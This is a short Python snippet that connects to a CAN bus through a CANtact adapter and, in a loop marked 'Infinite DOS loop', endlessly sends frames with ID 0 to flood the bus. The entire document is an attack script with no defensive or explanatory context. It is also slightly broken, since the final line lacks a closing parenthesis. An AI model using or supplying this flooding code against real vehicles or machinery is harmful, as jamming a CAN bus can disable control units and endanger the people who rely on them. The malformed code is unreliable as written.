# Connect to CAN
dev = cantact.CantactDev('/dev/ttyUSB0')
dev.start()

# Infinite DOS loop
while(True):
	dev.send(can.Frame(id=0)
